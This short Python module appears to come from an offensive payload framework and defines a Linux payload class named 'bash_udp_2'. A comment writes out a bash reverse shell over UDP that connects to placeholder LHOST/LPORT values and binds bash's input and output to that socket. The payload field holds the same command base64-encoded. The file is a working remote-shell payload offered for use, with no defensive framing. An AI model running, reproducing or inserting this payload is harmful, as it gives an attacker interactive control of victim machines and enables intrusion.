from lib.framework.core.payload import Payload


# 0<&196;exec 196<>/dev/udp/{LHOST}/{LPORT}; bash <&196 >&196 2>&196
class bash_udp_2(Payload):
    name = "bash_udp_2"
    platform = ["linux"]
    payload = "MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3VkcC97TEhPU1R9L3tMUE9SVH07IGJhc2ggPCYxOTYgPiYxOTYgMj4mMTk2"
